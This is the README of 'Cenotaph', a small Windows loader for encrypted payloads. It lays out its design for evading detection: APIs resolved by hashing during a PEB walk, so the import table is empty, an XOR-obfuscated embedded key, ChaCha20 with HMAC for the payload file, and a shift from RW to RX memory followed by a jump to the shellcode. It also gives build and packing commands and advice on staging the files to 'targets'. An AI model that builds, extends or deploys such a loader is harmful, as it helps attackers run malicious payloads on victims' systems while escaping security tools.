# Cenotaph

Minimal zero-import disk host for NaX payloads. A ~6.6 KB Windows exe that
resolves every API from the PEB, reads `<exe-stem>.dat`, verifies its HMAC,
decrypts it (ChaCha20 IETF), flips RW→RX, and hands off at offset 0. Nothing
on disk but the exe + its `.dat` — no shellcode in the wrapper, no imports in
the IAT, no beacon strings in the binary.

## Layout

```
Makefile            # build lanes (below)
include/Cenotaph.h  # PEB/UNICODE_STRING types + FNV hashes (modules + funcs)
include/CenKey.h    # XOR-obfuscated EKEY blob, generated by tools/encrypt.py
src/Ldr.c           # PEB walk: LdrModulePeb / LdrFunction (hash → export)
src/Utils.c         # zero/hex helpers
src/Host.c          # crypto block (ChaCha20 + SHA-256 + HMAC) + host flow
tools/encrypt.py    # packs a raw payload.bin into the .dat, rotates CenKey.h
tools/sha_probe.py  # deviation-knob brute-forcer for a wrong SHA-256 digest
```

Static audit is repo-wide: `../hostpayload_v2/scripts/validate.py`
(signature + import scan; `--snapshot <dump>` for memory dumps).

## The .dat format

`nonce (12) || ciphertext || hmac (32)` — HMAC is over `nonce || ciphertext`
(ciphertext only), key = 32 bytes taken from the obfuscated `CenKey.h` blob
(`EKEY[i] ^ CEN_OBF_BYTE`). ChaCha20 counter starts at 0 (RFC 7539 IETF mode;
pycryptodome 12-byte-nonce). The exe reads `.dat` next to itself — **rename
the exe and you must rename the dat to the same stem.**

## Build lanes

```bash
make               # cenotaph.exe     release: no CRT, windows subsystem, stripped
make debug         # cenotaph-debug.exe  console + battery self-test (below)
make payload PAYLOAD=NaX/build/nax.x64.bin DAT=cenotaph-debug.dat
make audit         # zero imports / empty API strings / no undefined syms
```

`make payload` rotates `CenKey.h` **every run**. The exe embeds the key, so
after regenerating the header you must rebuild BOTH and ship the pair
together. Pass `--keep-header` to encrypt.py when only the payload changed
and the shipped exe must stay byte-stable:

```bash
python3 tools/encrypt.py --payload adv.x64.bin --dat ceno-rel1.dat --keep-header
```

Always check the printed warning before staging.

## Debug battery

`make debug` builds with `CENOTAPH_DEBUG=1`. The console exe prints, before
any payload work: SHA-256 Init constants, the padded `abc` block, per-round
`a..h` after blocks, the end state of a direct `Transform`, the end-to-end
`sha256("abc")`, and a canonical HMAC vector. Compare against
`hashlib`/`hmac` only, never hand-typed constants — first diverging line
names the failing layer. `tools/sha_probe.py <digest>` brute-forces
endianness/schedule permutations against an observed wrong digest.

Known crypto bug class that cost a day: a 32-bit shift-count UB in the
length padding made mingw emit `shr %cl` (5-bit mask) and doubled the length
field, invalidating every HMAC. SHA-256 is big-endian here; the ChaCha
helpers are little-endian — do not cross them.

## Hard rules

- Payload artifacts (`.exe` builds, `.dat`, raw `.bin`) are never committed —
  staged to targets from a local webserver under fresh filenames (VM/browser
  caches bite on same-named re-downloads).
- `CenKey.h` in the repo is generated; treat a shipped exe + dat as an
  atomic pair keyed to the header they were built with.
- Host flow: RW alloc → verify → decrypt in place → scrub blob + key →
  `PAGE_EXECUTE_READ` → jump. No RWX, no leftover copies.
